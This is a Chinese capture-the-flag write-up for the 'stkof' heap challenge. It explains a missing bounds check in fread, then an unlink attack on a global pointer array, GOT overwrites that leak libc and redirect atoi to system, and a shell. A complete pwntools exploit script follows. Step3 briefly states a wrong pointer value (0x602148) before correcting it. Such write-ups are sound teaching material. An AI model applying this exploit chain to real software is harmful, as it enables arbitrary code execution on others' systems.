# 漏洞成因
## 程序关键结构体
程序使用一个全局指针数组 `s`（位于 `0x602140`）来存储通过 `malloc` 分配的堆块地址。该数组索引从1开始，由全局变量 `dword_602100` 记录当前分配的最大索引。每个分配的堆块指针被存储在 `(&s)[index]` 的位置。

## 漏洞定位
漏洞存在于 `read_in` 函数（对应 `sub_4009E8`）中。该函数根据用户提供的索引 `v2` 和大小 `n`，向对应的堆块 `ptr` 读入数据。读入操作使用 `fread(ptr, 1u, n, stdin)` 在一个循环中进行，直到读满 `n` 字节或出错。**关键在于，该函数没有检查用户提供的读入大小 `n` 是否超过了目标堆块实际分配的大小**。如果 `n` 大于堆块大小，`fread` 会向 `ptr` 写入超出其边界的数据，导致**堆溢出**。

```c
// sub_4009E8 关键代码片段
ptr = (&::s)[v2]; // 获取目标堆块指针
for ( i = fread(ptr, 1u, n, stdin); i > 0; i = fread(ptr, 1u, n, stdin) )
{
    ptr += i;
    n -= i;
}
```

# 漏洞利用过程：
利用思路是通过堆溢出伪造一个 `free` chunk，并利用 `unlink` 机制修改全局指针数组 `s`（即write-up中的 `global`）中某一项的值，从而获得一个“写全局变量任意地址”的原语。随后，通过修改 `s` 数组的内容，使其指向GOT表项，进而劫持控制流、泄露libc地址，最终将 `atoi` 的GOT表项覆盖为 `system` 地址，传入 `/bin/sh` 字符串来获取shell。

- Step1-3: 进行堆布局，分配几个chunk，利用溢出在chunk2中构造一个伪造的（fake）free chunk，并通过释放相邻的chunk3来触发 `unlink`。`unlink` 操作会将全局数组 `s` 中指向chunk2的指针（即 `&s[2]`）修改为 `&s[2] - 0x18`。
- Step4-5: 利用被修改的指针，向 `&s[2] - 0x18` 处写入数据，从而覆盖 `s[0]`、`s[1]`、`s[2]`，使它们分别指向 `free@got`、`puts@got`、`atoi@got`。接着，通过编辑 `s[0]` 指向的 `free@got`，将其改为 `puts@plt` 的地址。
- Step6: 调用 `free` 功能释放 `s[1]`（即 `puts@got` 指针），由于 `free@got` 已被覆盖为 `puts@plt`，这实际上会执行 `puts(puts@got)`，从而泄露 `puts` 函数在libc中的真实地址。
- Step7-8: 根据泄露的地址计算libc基址和 `system` 函数地址。然后通过编辑 `s[2]`（指向 `atoi@got`）将 `atoi@got` 覆盖为 `system` 地址。
- Step9: 当程序再次调用 `atoi`（例如在菜单选择时）并传入字符串 `/bin/sh` 作为参数时，实际上会执行 `system("/bin/sh")`，从而获得shell。

## Step1-3 (堆布局、构造Fake Chunk与触发Unlink)
- **Step1：** 分配三个chunk：chunk1(0x100)用于占用可能存在的IO缓冲区；chunk2(0x30)用于构造伪造的chunk；chunk3(0x80)作为触发unlink的目标。分配后，bss段全局数组 `s` 的 `s[1]`、`s[2]`、`s[3]` 分别存储了这三个chunk的地址。
- **Step2：** 利用 `read_in` 的堆溢出漏洞，向chunk2写入精心构造的payload。payload在chunk2的用户数据区伪造了一个大小为0x20的“free chunk”元数据（`prev_size`， `size`， `fd`, `bk`），并覆盖了chunk3的 `prev_size` 和 `size` 字段的 `PREV_INUSE` 位。这使得堆管理器在释放chunk3时，误以为其前一个chunk（即我们伪造的chunk）是空闲的，从而尝试进行前向合并，触发 `unlink` 操作。
    - **关键伪造：** 伪造chunk的 `fd = &s[2] - 0x18`, `bk = &s[2] - 0x10`。根据 `unlink` 宏的定义 `FD->bk = BK; BK->fd = FD;`，这会导致将 `s[2]` 的值修改为 `FD`，即 `&s[2] - 0x18`。
- **Step3：** 调用 `free` 功能释放chunk3，触发 `unlink`。成功后，`s[2]` 的值从指向chunk2的堆地址，变成了 `0x602148`（即 `&s[2]` 是 `0x602150`，减去 `0x18` 得到 `0x602138`。注意，`s` 数组起始于 `0x602140`，`s[2]` 在 `0x602150`，所以 `&s[2] - 0x18 = 0x602138`）。这使得后续通过索引2（`s[2]`）进行的读写操作，目标地址变成了bss段中 `s[2]` 指针本身之前的位置。

## Step4-5 (劫持GOT表)
- **Step4：** 通过编辑chunk2（现在 `s[2]` 指向 `0x602138`），向 `0x602138` 写入数据。由于 `0x602138` 相对于 `s` 数组起始地址 `0x602140` 的偏移为 `-8`，写入的数据会覆盖从 `s[0]` 开始的内容。payload为 `'a'*8 + p64(free@got) + p64(puts@got) + p64(atoi@got)`。这8个字节的 `'a'` 覆盖了 `0x602138-0x60213F` 的无关区域，随后：
    - `s[0]` (`0x602140`) 被写为 `free@got` 地址 (`0x602018`)。
    - `s[1]` (`0x602148`) 被写为 `puts@got` 地址 (`0x602020`)。
    - `s[2]` (`0x602150`) 被写为 `atoi@got` 地址 (`0x602068`)。
- **Step5：** 通过编辑索引0（`s[0]` 现在指向 `free@got`），向 `free@got` 写入 `puts@plt` 的地址。至此，程序中所有调用 `free` 的地方都将转而执行 `puts`。

## Step6 (泄露Libc地址)
- **Step6：** 调用 `free` 功能释放索引1（`s[1]` 现在指向 `puts@got`）。程序执行 `free(s[1])`，由于 `free@got` 被改为 `puts@plt`，实际执行 `puts(puts@got)`。这会打印出 `puts` 函数在libc中的实际地址。通过接收并解析这个地址，可以计算出libc的基址、`system` 地址以及字符串 `/bin/sh` 的地址。

## Step7-9 (覆盖atoi并获取Shell)
- **Step7：** 通过编辑索引2（`s[2]` 现在指向 `atoi@got`），向 `atoi@got` 写入计算得到的 `system` 函数地址。
- **Step8-9：** 当程序主循环再次调用 `fgets` 和 `atoi` 解析用户菜单选择时，如果此时我们向程序发送字符串 `/bin/sh\x00`，`atoi` 函数将被调用，但其GOT表项已被替换为 `system`。因此，`system("/bin/sh")` 得以执行，从而获得一个shell。

# Exploit：
```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./stkof"
stkof = ELF('./stkof')
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./stkof")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')
head = 0x602140  # 全局指针数组 s 的地址

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))

def exp():
    # Step1: 分配初始chunk，chunk1用于占用可能的IO缓冲区，避免干扰后续堆布局
    alloc(0x100)  # idx 1
    alloc(0x30)   # idx 2, 用于构造fake chunk
    alloc(0x80)   # idx 3, 用于触发unlink

    # Step2: 在chunk2构造fake chunk并溢出修改chunk3的元数据
    # fake chunk位于 global[2] (即 head+16) 指向的位置，伪造其size为0x20
    payload = p64(0)                # prev_size
    payload += p64(0x20)            # size
    payload += p64(head + 16 - 0x18) # fd -> 指向 (&global[2]) - 0x18
    payload += p64(head + 16 - 0x10) # bk -> 指向 (&global[2]) - 0x10
    payload += p64(0x20)            # next chunk's prev_size (绕过检查)
    payload = payload.ljust(0x30, b'a') # 填充至chunk2用户数据区结束
    # 溢出部分：修改chunk3的prev_size和size的PREV_INUSE位
    payload += p64(0x30)            # chunk3的prev_size，使其指向fake chunk
    payload += p64(0x90)            # chunk3的size，将PREV_INUSE位清零(0x90 & 1 = 0)
    edit(2, len(payload), payload)

    # Step3: 释放chunk3，触发unlink，导致 global[2] = &global[2] - 0x18
    free(3)
    p.recvuntil('OK\n')

    # Step4: 利用被修改的global[2]指针，覆盖global数组，使其指向关键GOT表项
    payload = b'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(stkof.got['atoi'])
    edit(2, len(payload), payload)

    # Step5: 将free@got改为puts@plt，使后续free调用实际执行puts
    payload = p64(stkof.plt['puts'])
    edit(0, len(payload), payload)

    # Step6: 释放global[1] (即puts@got指针)，触发 puts(puts@got)，泄露libc地址
    free(1)
    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, b'\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base: ' + hex(libc_base))
    log.success('/bin/sh addr: ' + hex(binsh_addr))
    log.success('system addr: ' + hex(system_addr))

    # Step7: 将atoi@got改为system地址
    payload = p64(system_addr)
    edit(2, len(payload), payload)

    # Step8-9: 发送/bin/sh，触发 atoi("/bin/sh") -> system("/bin/sh")
    p.sendline(b'/bin/sh\x00')
    p.interactive()

if __name__ == "__main__":
    exp()
```
